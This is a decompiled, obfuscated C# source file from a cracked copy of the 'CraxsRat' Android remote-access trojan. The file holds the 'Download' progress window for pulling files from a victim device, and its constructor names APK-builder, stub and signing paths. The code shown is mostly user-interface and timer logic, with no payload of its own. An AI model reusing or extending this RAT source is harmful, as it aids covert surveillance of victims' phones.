// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.Download
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class Download : Form
  {
    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((Drooper) this).components = (IContainer) new System.ComponentModel.Container();
label_1:
      int num1 = -410373162;
      DataGridViewCellStyle gridViewCellStyle1;
      DataGridViewCellStyle gridViewCellStyle2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((num1 + (-1688345435 * (-255051177 * (-1203240294 - 1622434391 - (842020113 - 71207338))) ^ ~((-1306088513 * -109749567 ^ -540939782) * 1738898175)) ^ --847531285 ^ -857367076 - 1845745142 + (-1836897674 - -2142290845) ^ ~(641592533 + 421989890)) * 1085635133 - --1507026590)) % 48U)
        {
          case 0:
            this.DGV0.AllowUserToAddRows = false;
            num1 = (int) num2 * -1251197844 ^ -2025656523;
            continue;
          case 1:
            gridViewCellStyle2.SelectionForeColor = Color.Black;
            num1 = (int) num2 * -478365022 ^ 1824579504;
            continue;
          case 2:
            this.Column1.SortMode = DataGridViewColumnSortMode.NotSortable;
            num1 = (int) num2 * 2057897034 ^ 1516992535;
            continue;
          case 3:
            this.Column6.HeaderText = EXGuarder.\u0034B4A026F;
            num1 = (int) num2 * -214158527 ^ 581584084;
            continue;
          case 4:
            gridViewCellStyle2.BackColor = Color.Black;
            gridViewCellStyle2.Font = new Font(EXGuarder.\u003153D2D5F, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -752978153 ^ 764294947;
            continue;
          case 5:
            this.DGV0.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.AllCells;
            this.DGV0.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
            num1 = (int) num2 * 656281732 ^ 1586746534;
            continue;
          case 6:
            ((ISupportInitialize) this.DGV0).BeginInit();
            num1 = (int) num2 * 1063509468 ^ -83120094;
            continue;
          case 7:
            this.ResumeLayout(false);
            num1 = (int) num2 * -1947885199 ^ -1674224450;
            continue;
          case 8:
            this.DGV0.Dock = DockStyle.Fill;
            this.DGV0.EditMode = DataGridViewEditMode.EditProgrammatically;
            this.DGV0.EnableHeadersVisualStyles = false;
            this.DGV0.GridColor = Color.FromArgb(42, 42, 42);
            num1 = (int) num2 * 1561434367 ^ 1051147184;
            continue;
          case 9:
            this.DGV0.ColumnHeadersDefaultCellStyle = gridViewCellStyle1;
            num1 = (int) num2 * 223096761 ^ 772389652;
            continue;
          case 10:
            this.Controls.Add((Control) this.ProgressBar1);
            num1 = (int) num2 * 1045598478 ^ 2086043161;
            continue;
          case 11:
            this.DGV0.Size = new Size(343, 110);
            num1 = (int) num2 * -1836356940 ^ 1145346966;
            continue;
          case 12:
            gridViewCellStyle1 = new DataGridViewCellStyle();
            num1 = (int) num2 * 2038655289 ^ 1879092348;
            continue;
          case 13:
            this.DGV0.RowHeadersVisible = false;
            this.DGV0.ScrollBars = ScrollBars.None;
            this.DGV0.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            num1 = (int) num2 * -140807414 ^ 1904857339;
            continue;
          case 14:
            gridViewCellStyle1.SelectionBackColor = SystemColors.Highlight;
            gridViewCellStyle1.SelectionForeColor = SystemColors.HighlightText;
            num1 = (int) num2 * 1463704636 ^ -539131800;
            continue;
          case 15:
            this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            this.Name = EXGuarder.\u00310481B28;
            num1 = (int) num2 * -2107211544 ^ -1045869244;
            continue;
          case 16:
            this.DGV0.BackgroundColor = Color.Black;
            num1 = (int) num2 * -1134019421 ^ -1714662122;
            continue;
          case 17:
            gridViewCellStyle2.ForeColor = Color.FromArgb(190, 190, 190);
            gridViewCellStyle2.SelectionBackColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * 265434719 ^ 1500462608;
            continue;
          case 18:
            this.Column1.HeaderText = EXGuarder.\u003400A6A0D;
            num1 = (int) num2 * 618234345 ^ -1151733277;
            continue;
          case 19:
            this.ProgressBar1.Name = EXGuarder.\u003143F702D;
            this.ProgressBar1.Size = new Size(343, 18);
            num1 = (int) num2 * -1133455882 ^ 459024854;
            continue;
          case 20:
            this.Column6 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * -1181071693 ^ -351559817;
            continue;
          case 21:
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(343, 128);
            this.Controls.Add((Control) this.DGV0);
            num1 = (int) num2 * 2109920588 ^ -117060320;
            continue;
          case 22:
            gridViewCellStyle1.WrapMode = DataGridViewTriState.True;
            num1 = (int) num2 * 1176993332 ^ -729446593;
            continue;
          case 23:
            gridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * 501504277 ^ -384794995;
            continue;
          case 24:
            this.SuspendLayout();
            this.ProgressBar1.Dock = DockStyle.Bottom;
            num1 = (int) num2 * -1816860788 ^ -1444141176;
            continue;
          case 25:
            this.Column6.Name = EXGuarder.\u0034B5C2A73;
            num1 = (int) num2 * -1245555495 ^ -45250209;
            continue;
          case 26:
            this.Column1 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * 1033162101 ^ -1257604500;
            continue;
          case 27:
            goto label_3;
          case 28:
            goto label_1;
          case 29:
            this.Column1.Width = 32;
            num1 = (int) num2 * 1233048675 ^ -1218163482;
            continue;
          case 30:
            this.DGV0.Location = new Point(0, 0);
            this.DGV0.Name = EXGuarder.\u0036C571B51;
            this.DGV0.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
            num1 = (int) num2 * 506794969 ^ -1438645619;
            continue;
          case 31:
            this.DGV0.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DGV0.Columns.AddRange((DataGridViewColumn) this.Column1, (DataGridViewColumn) this.Column6);
            num1 = (int) num2 * 2099634951 ^ -815821756;
            continue;
          case 32:
            gridViewCellStyle2.WrapMode = DataGridViewTriState.False;
            this.DGV0.DefaultCellStyle = gridViewCellStyle2;
            num1 = (int) num2 * 1059065554 ^ -1746870;
            continue;
          case 33:
            this.DGV0.AllowUserToResizeColumns = false;
            num1 = (int) num2 * 1220070380 ^ -1843279893;
            continue;
          case 34:
            this.ProgressBar1.TabIndex = 0;
            num1 = (int) num2 * -1511404516 ^ 957654442;
            continue;
          case 35:
            this.Column1.Name = EXGuarder.\u0036E507164;
            num1 = (int) num2 * -1785243178 ^ 1616229414;
            continue;
          case 36:
            this.Column6.SortMode = DataGridViewColumnSortMode.NotSortable;
            num1 = (int) num2 * -1945452643 ^ 354834951;
            continue;
          case 37:
            this.TimeFinish = new Timer(((Drooper) this).components);
            this.TOpacity = new Timer(((Drooper) this).components);
            num1 = (int) num2 * -393185579 ^ -1811653351;
            continue;
          case 38:
            gridViewCellStyle2 = new DataGridViewCellStyle();
            this.ProgressBar1 = new ProgressBar();
            this.DGV0 = new DataGridView();
            num1 = (int) num2 * 1977561295 ^ -91489818;
            continue;
          case 39:
            gridViewCellStyle1.Alignment = DataGridViewContentAlignment.MiddleLeft;
            gridViewCellStyle1.BackColor = Color.Black;
            gridViewCellStyle1.Font = new Font(EXGuarder.\u003153D2D5F, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            gridViewCellStyle1.ForeColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * 1834488663 ^ 1577399977;
            continue;
          case 40:
            this.DGV0.TabIndex = 4;
            num1 = (int) num2 * 1537099693 ^ -413528852;
            continue;
          case 41:
            this.DGV0.AllowUserToResizeRows = false;
            num1 = (int) num2 * -753015945 ^ 983016644;
            continue;
          case 42:
            this.Opacity = 0.0;
            num1 = (int) num2 * -537314810 ^ -897604987;
            continue;
          case 43:
            this.Text = EXGuarder.\u00310481B28;
            ((ISupportInitialize) this.DGV0).EndInit();
            num1 = (int) num2 * -1967499140 ^ 2008651385;
            continue;
          case 44:
            this.DGV0.BorderStyle = BorderStyle.None;
            this.DGV0.CellBorderStyle = DataGridViewCellBorderStyle.None;
            this.DGV0.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
            num1 = (int) num2 * 1399732804 ^ 811394829;
            continue;
          case 45:
            this.Column6.Width = 17;
            this.TOpacity.Interval = 1;
            num1 = (int) num2 * -1672135849 ^ -319539360;
            continue;
          case 46:
            this.ProgressBar1.Location = new Point(0, 110);
            num1 = (int) num2 * 1558443757 ^ 1584373095;
            continue;
          case 47:
            this.DGV0.AllowUserToDeleteRows = false;
            num1 = (int) num2 * 1572993595 ^ -1459426118;
            continue;
          default:
            goto label_50;
        }
      }
label_3:
      return;
label_50:;
    }

    internal virtual ProgressBar ProgressBar1
    {
      get => ((Drooper) this)._ProgressBar1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Drooper) this)._ProgressBar1 = value;
    }

    internal virtual DataGridView DGV0
    {
      get => ((Drooper) this)._DGV0;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Drooper) this)._DGV0 = value;
    }

    internal virtual Timer TimeFinish
    {
      get => ((Drooper) this)._TimeFinish;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TimeFinish_Tick);
label_1:
        int num1 = 2040417819;
        Timer timeFinish;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(-~(num1 + (1971430017 * 1741522653 - (~(992053005 * (-667154819 ^ -228967236)) + ~-454468210 * 260117077)) - ~(1945495803 * 628242070)) + ~-539195316)) % 7U)
          {
            case 0:
              int num3 = timeFinish == null ? 1648329665 : (num3 = 1781815997);
              num1 = num3 ^ (int) num2 * 699403657;
              continue;
            case 1:
              ((Drooper) this)._TimeFinish = value;
              timeFinish = ((Drooper) this)._TimeFinish;
              int num4;
              num1 = num4 = timeFinish == null ? 694727421 : (num4 = -2060345083);
              continue;
            case 2:
              goto label_1;
            case 3:
              timeFinish = ((Drooper) this)._TimeFinish;
              num1 = (int) num2 * -1650291886 ^ 360896337;
              continue;
            case 4:
              timeFinish.Tick += eventHandler;
              num1 = (int) num2 * 1351296457 ^ -2072392573;
              continue;
            case 5:
              timeFinish.Tick -= eventHandler;
              num1 = (int) num2 * -511004147 ^ -690287097;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column1
    {
      get => ((Drooper) this)._Column1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Drooper) this)._Column1 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column6
    {
      get => ((Drooper) this)._Column6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Drooper) this)._Column6 = value;
    }

    internal virtual Timer TOpacity
    {
      get => ((Drooper) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
label_1:
        int num1 = -1067920398;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Timer topacity;
          switch ((num3 = (uint) -((~(-692996992 - (1730814852 - 358178972)) - (num2 * -467972919 - (-((1416408132 - 520252695) * 1166076653) ^ ~(-1235610916 * -1060977685) * 1922035715)) ^ -555626511) - --1550523291)) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              topacity = ((Drooper) this)._TOpacity;
              num1 = (int) num3 * 1560995661 ^ -124855355;
              continue;
            case 2:
              goto label_1;
            case 3:
              topacity.Tick += eventHandler;
              num1 = (int) num3 * 2143883595 ^ 2010535242;
              continue;
            case 4:
              topacity.Tick -= eventHandler;
              num1 = (int) num3 * -265039126 ^ -449654162;
              continue;
            case 5:
              ((Drooper) this)._TOpacity = value;
              topacity = ((Drooper) this)._TOpacity;
              num1 = -1628023583;
              continue;
            case 6:
              int num4 = topacity == null ? -694930219 : (num4 = 349645370);
              num1 = num4 ^ (int) num3 * -1509522367;
              continue;
            case 7:
              int num5 = topacity == null ? 1974765263 : (num5 = -1449673418);
              num1 = num5 ^ (int) num3 * -677965329;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    private void SpyStyle()
    {
      IEnumerator<DataGridView> enumerator;
      try
      {
        enumerator = this.Controls.OfType<DataGridView>().GetEnumerator();
label_1:
        int num1 = 499764450;
        DataGridView current;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-(num1 - -1779166531 * ((-328503714 - 570729681 - (-84949556 - -363643213) ^ (729369008 ^ 1445560533) + (1188719300 + 1653011243)) - (1244036282 + -1249827061 - (-1298032247 ^ -574608223 ^ -963334084))) - -709275589 * ~(-209944160 - 1017206323 - -1319463781)) ^ 289837070 ^ 872804697 ^ -310656137) * -223118565)) % 9U)
          {
            case 0:
              int num3;
              num1 = num3 = enumerator.MoveNext() ? 229571125 : (num3 = -169953578);
              continue;
            case 1:
              current.DefaultCellStyle.SelectionForeColor = Settings.DefaultColor_Background;
              num1 = (int) num2 * 1932987386 ^ -330166740;
              continue;
            case 2:
              current = enumerator.Current;
              num1 = -154307332;
              continue;
            case 3:
              current.BackColor = Settings.DefaultColor_Background;
              current.ColumnHeadersDefaultCellStyle.BackColor = Settings.DefaultColor_Background;
              current.DefaultCellStyle.BackColor = Settings.DefaultColor_Background;
              num1 = (int) num2 * 2129410519 ^ -1504217091;
              continue;
            case 4:
              goto label_1;
            case 5:
              goto label_14;
            case 6:
              current.DefaultCellStyle.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              current.DefaultCellStyle.SelectionBackColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              current.ColumnHeadersDefaultCellStyle.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num1 = (int) num2 * -1257083438 ^ 1587104936;
              continue;
            case 7:
              current.BackgroundColor = Settings.DefaultColor_Background;
              num1 = (int) num2 * -1881946382 ^ -659507964;
              continue;
            case 8:
              num1 = (int) num2 * -1371176837 ^ 1667545200;
              continue;
            default:
              goto label_10;
          }
        }
label_14:
        return;
label_10:;
      }
      finally
      {
        if (enumerator != null)
        {
label_12:
          int num4 = 1495352384;
          while (true)
          {
            uint num5;
            switch ((num5 = (uint) ((-(num4 - -1779166531 * ((-328503714 - 570729681 - (-84949556 - -363643213) ^ (729369008 ^ 1445560533) + (1188719300 + 1653011243)) - (1244036282 + -1249827061 - (-1298032247 ^ -574608223 ^ -963334084))) - -709275589 * ~(-209944160 - 1017206323 - -1319463781)) ^ 289837070 ^ 872804697 ^ -310656137) * -223118565)) % 3U)
            {
              case 1:
                enumerator.Dispose();
                num4 = (int) num5 * -1439256022 ^ 83685940;
                continue;
              case 2:
                goto label_12;
              default:
                goto label_16;
            }
          }
        }
label_16:;
      }
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_4;
label_1:
      int num1 = -84316082;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~((~num1 ^ -((1123479524 - -1846105103) * 142641175) * 847562413) - (1669838545 * (1451057509 - 839903922) - ((-663414845 ^ -657189930) - 1187540614))) * -689333903 ^ -866351655)) % 5U)
        {
          case 0:
            num1 = (int) num2 * -977684401 ^ 1641549218;
            continue;
          case 1:
            goto label_3;
          case 2:
            goto label_1;
          case 3:
            goto label_4;
          case 4:
            this.Opacity += 0.1;
            num1 = (int) num2 * 2128794903 ^ -1647262645;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_4:
      this.TOpacity.Enabled = false;
      num1 = 1163053217;
      goto label_2;
    }

    private void Download_Load(object sender, EventArgs e)
    {
      Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
      int x = checked (workingArea.Width - this.Width);
      workingArea = Screen.PrimaryScreen.WorkingArea;
      int y = checked (workingArea.Height - this.Height);
      this.Location = new Point(x, y);
label_1:
      int num1 = 1140403541;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~-(-((num1 ^ ~(-105703391 * ~(131651713 * -938721993 ^ 1324387652 ^ 1211030593))) - (-(-2007221195 - -1414581224 - 784443694) - (--848620417 ^ -(819703203 * -1774117331)))) ^ -687559108)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            this.TimeFinish.Interval = 1000;
            this.TimeFinish.Enabled = true;
            this.Text = ((EditConnections) this).Title;
            this.TOpacity.Interval = Settings.T_Interval;
            num1 = (int) num2 * -60179037 ^ 130571224;
            continue;
          case 2:
            goto label_3;
          case 3:
            this.TOpacity.Enabled = true;
            num1 = (int) num2 * -737850580 ^ 819357715;
            continue;
          case 4:
            this.Icon = new Icon(Settings.res_Path + EXGuarder.\u0032E574E75);
            this.SpyStyle();
            this.DGV0.ColumnHeadersDefaultCellStyle.Font = Settings.f;
            this.DGV0.DefaultCellStyle.Font = Settings.f;
            num1 = (int) num2 * 1707727880 ^ 933434792;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    private void Download_Closing(object sender, CancelEventArgs e)
    {
      this.TimeFinish.Enabled = false;
      // ISSUE: reference to a compiler-generated field
      if (((Drooper._Closure\u0024__77\u002D0) this).classClient == null)
        goto label_6;
label_1:
      int num1 = 1403034227;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((-((-~551339482 ^ ~(1928918048 ^ 1838017280)) - (~num2 ^ ~(1697358277 * (1164755172 + 575683407) * 1223448295))) - 1449675549 * 1851837535) * -843964221)) % 6U)
        {
          case 0:
            goto label_3;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Data._Closure\u0024__39\u002D8) ((Drooper._Closure\u0024__77\u002D0) this).classClient).qit = true;
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Drooper._Closure\u0024__77\u002D0) this).classClient.Close(((Drooper._Closure\u0024__77\u002D0) this).Client);
            num1 = (int) num3 * 429228217 ^ 1780619652;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_6;
          case 4:
            // ISSUE: reference to a compiler-generated field
            ((Drooper._Closure\u0024__77\u002D0) this).FileStream.Dispose();
            num1 = (int) num3 * 573752638 ^ -313137383;
            continue;
          case 5:
            // ISSUE: reference to a compiler-generated field
            ((Drooper._Closure\u0024__77\u002D0) this).FileStream.Close();
            num1 = (int) num3 * 350640479 ^ 1916209677;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_6:
      // ISSUE: reference to a compiler-generated field
      num1 = ((Drooper._Closure\u0024__77\u002D0) this).FileStream == null ? 1482008568 : (num1 = 760618846);
      goto label_2;
    }

    private void TimeFinish_Tick(object sender, EventArgs e)
    {
      if (this.DGV0.Rows.Count <= 0)
        return;
label_1:
      int num1 = 1932912308;
      string time;
      DateTime dateTime1;
      long num2;
      DateTime dateTime2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) ((~((num1 ^ -(~-691248837 * -1974734983) - -~(-695737643 * 1653627399) + (-1289939187 - 60497966 - ~1679380309 + ~(-2053761712 - 2034701938) ^ -1557767382 ^ -505474156 - -600991359)) + (-((-799210847 - 1289306224) * -2137760745) ^ ~(~113603735 + --1096381652)) + (2033524127 * -1053941481 ^ 1368336502 + 392664430 ^ ~1766828913 ^ ~1865974276)) - 1115015267) * 701240143)) % 10U)
        {
          case 0:
            int num4 = ((EditConnections) this)._stream <= 0L ? 2078757369 : (num4 = 455813638);
            num1 = num4 ^ (int) num3 * 1443931727;
            continue;
          case 1:
            int num5 = ((EditConnections) this)._stream > ((EditConnections) this).TotalSize ? -198362382 : (num5 = -1209235882);
            num1 = num5 ^ (int) num3 * -250999103;
            continue;
          case 2:
            dateTime2 = DateTime.Now;
            num1 = (int) num3 * -1262862142 ^ -355463904;
            continue;
          case 3:
            dateTime2 = dateTime2.AddHours((double) dateTime1.Hour);
            dateTime2 = dateTime2.AddMinutes((double) dateTime1.Minute);
            dateTime2 = dateTime2.AddSeconds((double) dateTime1.Second);
            this.DGV0.Rows[3].Cells[1].Value = (object) string.Format(EXGuarder.\u00304262778, (object) time);
            num1 = (int) num3 * -922216606 ^ -159251891;
            continue;
          case 4:
            goto label_1;
          case 5:
            dateTime1 = Convert.ToDateTime(time);
            num1 = (int) num3 * -1340295943 ^ 1330007963;
            continue;
          case 6:
            num2 = checked ((long) Math.Round(unchecked ((double) checked (((EditConnections) this).TotalSize - ((EditConnections) this)._stream) * ((EditConnections) this).elapsed_time.TotalSeconds / (double) ((EditConnections) this)._stream)));
            num1 = (int) num3 * -1424096392 ^ -992522084;
            continue;
          case 7:
            ((EditConnections) this).stop_time = DateAndTime.Now;
            ((EditConnections) this).elapsed_time = ((EditConnections) this).stop_time.Subtract(((EditConnections) this).start_time);
            num1 = (int) num3 * 1585044675 ^ 349894268;
            continue;
          case 8:
            goto label_12;
          case 9:
            time = Codes.ToTime(num2);
            int num6 = time.Equals(EXGuarder.\u0035B725062) ? -1177125392 : (num6 = 786151220);
            num1 = num6 ^ (int) num3 * -1448531893;
            continue;
          default:
            goto label_13;
        }
      }
label_12:
      return;
label_13:;
    }

    public Download()
    {
      this.FormClosing += new FormClosingEventHandler(((Drooper) this).Drooper_FormClosing);
      this.Load += new EventHandler(((Drooper) this).Drooper_Load);
      ((Editor) this).TargetAPKPATH = EXGuarder.\u0030C243D43;
      ((Editor) this).TargetApkicon = EXGuarder.\u0030C243D43;
      ((Editor) this).originalapkname = EXGuarder.\u0030C243D43;
      ((Editor) this).APKINFO = EXGuarder.\u0030C243D43;
      ((Editor) this).outputpath = EXGuarder.\u0030C243D43;
      ((Editor) this).buildapkpath = EXGuarder.\u0030C243D43;
      ((Editor) this).assetspath = EXGuarder.\u0030C243D43;
      ((EditSocket) this).ClassesPath = EXGuarder.\u0030C243D43;
      ((EditSocket) this).stringspath = EXGuarder.\u0030C243D43;
      ((EditSocket) this).stubicon = EXGuarder.\u0030C243D43;
      ((EditSocket) this).BASEPATH = EXGuarder.\u0030C243D43;
      ((EditSocket) this).STUBPATH = EXGuarder.\u0030C243D43;
      ((EditSocket) this).apktoolpath = EXGuarder.\u0030C243D43;
      ((EditSocket) this).Apksignerpath = EXGuarder.\u0030C243D43;
      ((EditSocket) this).ApkZIPpath = EXGuarder.\u0030C243D43;
      ((EditSocket) this).Apkeditorpath = EXGuarder.\u0030C243D43;
      ((EditSocket) this).C = EXGuarder.\u0030C243D43;
      ((EditSocket) this).K = EXGuarder.\u0030C243D43;
      ((EditSocket) this).MainfistPath = EXGuarder.\u0030C243D43;
      ((EditSocket) this).ClassGen1 = EXGuarder.\u0032409434E;
      ((EditSocket) this).ClassGen2 = EXGuarder.\u003296C3036;
      ((EditSocket) this).ClassGen3 = EXGuarder.\u0030526353D;
      ((EditSocket) this).ClassGen4 = EXGuarder.\u0035923475D;
      ((Faker) this).ClassGen5 = EXGuarder.\u0036A487243;
      ((Faker) this).N_Class1 = EXGuarder.\u0030C243D43;
      ((Faker) this).N_Class2 = EXGuarder.\u0030C243D43;
      ((Faker) this).N_Class3 = EXGuarder.\u0030C243D43;
      ((Faker) this).N_Class4 = EXGuarder.\u0030C243D43;
      ((Faker) this).N_Class5 = EXGuarder.\u0030C243D43;
      ((Faker) this).firsttry = false;
      ((Faker) this).HoldExtract = false;
      ((Faker) this).Waitbuild = true;
      ((Faker) this).Waitprotect = true;
      ((Faker) this).cou = 0;
      ((Faker) this).FoundJava = false;
      ((Drooper) this).InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = 1288445311;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) -(~-17278499 - (~433511646 - -1169429080 - (~(~-1374919668 - (1815606585 + 536683777)) - ~-num2)))) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              ((EditConnections) this).components.Dispose();
              num1 = (int) num3 * 1806708132 ^ 1727343645;
              continue;
            case 3:
              int num4 = ((EditConnections) this).components == null ? 1534595312 : (num4 = 1453615995);
              num1 = num4 ^ (int) num3 * 91074523;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }
  }
}
